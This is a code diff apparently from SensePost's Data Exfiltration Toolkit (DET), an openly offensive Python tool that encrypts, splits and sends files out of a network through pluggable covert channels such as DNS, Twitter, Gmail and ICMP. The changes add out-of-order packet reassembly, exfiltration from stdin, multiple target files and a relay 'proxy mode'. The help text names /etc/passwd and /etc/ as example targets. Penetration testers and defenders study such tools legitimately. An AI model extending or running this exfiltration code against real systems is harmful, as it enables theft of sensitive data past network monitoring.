@@ -15,6 +15,10 @@ from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
+from cStringIO import StringIO
+
+if getattr(sys, 'frozen', False):
+    os.chdir(sys._MEIPASS)
 
 KEY = ""
 MIN_TIME_SLEEP = 1
@@ -89,11 +93,10 @@ def aes_decrypt(message, key=KEY):
         return None
 
 # Do a md5sum of the file
-def md5(fname):
+def md5(f):
     hash = hashlib.md5()
-    with open(fname) as f:
-        for chunk in iter(lambda: f.read(4096), ""):
-            hash.update(chunk)
+    for chunk in iter(lambda: f.read(4096), ""):
+        hash.update(chunk)
     return hash.hexdigest()
 
 
@@ -180,7 +183,8 @@ class Exfiltration(object):
             files[jobid]['checksum'] = message[3].lower()
             files[jobid]['filename'] = message[1].lower()
             files[jobid]['data'] = []
-            files[jobid]['packets_number'] = []
+            files[jobid]['packets_order'] = []
+            files[jobid]['packets_len'] = -1
             warning("Register packet for file %s with checksum %s" %
                     (files[jobid]['filename'], files[jobid]['checksum']))
 
@@ -189,6 +193,9 @@ class Exfiltration(object):
         fname = files[jobid]['filename']
         filename = "%s.%s" % (fname.replace(
             os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
+        #Reorder packets before reassembling / ugly one-liner hack
+        files[jobid]['packets_order'], files[jobid]['data'] = \
+                [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
         content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
@@ -196,7 +203,7 @@ class Exfiltration(object):
         f = open(filename, 'w')
         f.write(content)
         f.close()
-        if (files[jobid]['checksum'] == md5(filename)):
+        if (files[jobid]['checksum'] == md5(open(filename))):
             ok("File %s recovered" % (fname))
         else:
             warning("File %s corrupt!" % (fname))
@@ -216,13 +223,21 @@ class Exfiltration(object):
                     self.register_file(message)
                 # done packet
                 elif (message[2] == "DONE"):
-                    self.retrieve_file(jobid)
+                    files[jobid]['packets_len'] = int(message[1])
+                    #Check if all packets have arrived
+                    if files[jobid]['packets_len'] == len(files[jobid]['data']):
+                        self.retrieve_file(jobid)
+                    else:
+                        warning("[!] Received the last packet, but some are still missing. Waiting for the rest...")
                 # data packet
                 else:
                     # making sure there's a jobid for this file
-                    if (jobid in files and message[1] not in files[jobid]['packets_number']):
+                    if (jobid in files and message[1] not in files[jobid]['packets_order']):
                         files[jobid]['data'].append(''.join(message[2:]))
-                        files[jobid]['packets_number'].append(message[1])
+                        files[jobid]['packets_order'].append(int(message[1]))
+                        #In case this packet was the last missing one
+                        if files[jobid]['packets_len'] == len(files[jobid]['data']):
+                            self.retrieve_file(jobid)
         except:
             raise
             pass
@@ -236,10 +251,22 @@ class ExfiltrateFile(threading.Thread):
         self.exfiltrate = exfiltrate
         self.jobid = ''.join(random.sample(
             string.ascii_letters + string.digits, 7))
-        self.checksum = md5(file_to_send)
+        self.checksum = '0'
         self.daemon = True
 
     def run(self):
+        # checksum
+        if self.file_to_send == 'stdin':
+            file_content = sys.stdin.read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        else:
+            file_content = open(self.file_to_send, 'rb').read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        self.checksum = md5(buf)
+        del file_content
+
         # registering packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
         ok("Using {0} as transport method".format(plugin_name))
@@ -255,7 +282,6 @@ class ExfiltrateFile(threading.Thread):
 
         # sending the data
         f = tempfile.SpooledTemporaryFile()
-        e = open(self.file_to_send, 'rb')
         data = e.read()
         if COMPRESSION:
             data = compress(data)
@@ -303,7 +329,7 @@ def main():
         description='Data Exfiltration Toolkit (SensePost)')
     parser.add_argument('-c', action="store", dest="config", default=None,
                         help="Configuration file (eg. '-c ./config-sample.json')")
-    parser.add_argument('-f', action="store", dest="file",
+    parser.add_argument('-f', action="append", dest="file",
                         help="File to exfiltrate (eg. '-f /etc/passwd')")
     parser.add_argument('-d', action="store", dest="folder",
                         help="Folder to exfiltrate (eg. '-d /etc/')")
@@ -311,8 +337,11 @@ def main():
                         default=None, help="Plugins to use (eg. '-p dns,twitter')")
     parser.add_argument('-e', action="store", dest="exclude",
                         default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
-    parser.add_argument('-L', action="store_true",
+    listenMode = parser.add_mutually_exclusive_group()
+    listenMode.add_argument('-L', action="store_true",
                         dest="listen", default=False, help="Server mode")
+    listenMode.add_argument('-Z', action="store_true",
+                        dest="proxy", default=False, help="Proxy mode")
     results = parser.parse_args()
 
     if (results.config is None):
@@ -335,12 +364,15 @@ def main():
     KEY = config['AES_KEY']
     app = Exfiltration(results, KEY)
 
-    # LISTEN MODE
-    if (results.listen):
+    # LISTEN/PROXY MODE
+    if (results.listen or results.proxy):
         threads = []
         plugins = app.get_plugins()
         for plugin in plugins:
-            thread = threading.Thread(target=plugins[plugin]['listen'])
+            if results.listen:
+                thread = threading.Thread(target=plugins[plugin]['listen'])
+            elif results.proxy:
+                thread = threading.Thread(target=plugins[plugin]['proxy'])
             thread.daemon = True
             thread.start()
             threads.append(thread)
@@ -355,7 +387,7 @@ def main():
                      f in listdir(results.folder)
                      if isfile(join(results.folder, f))]
         else:
-            files = [results.file]
+            files = list(set(results.file))
 
         threads = []
         for file_to_send in files:
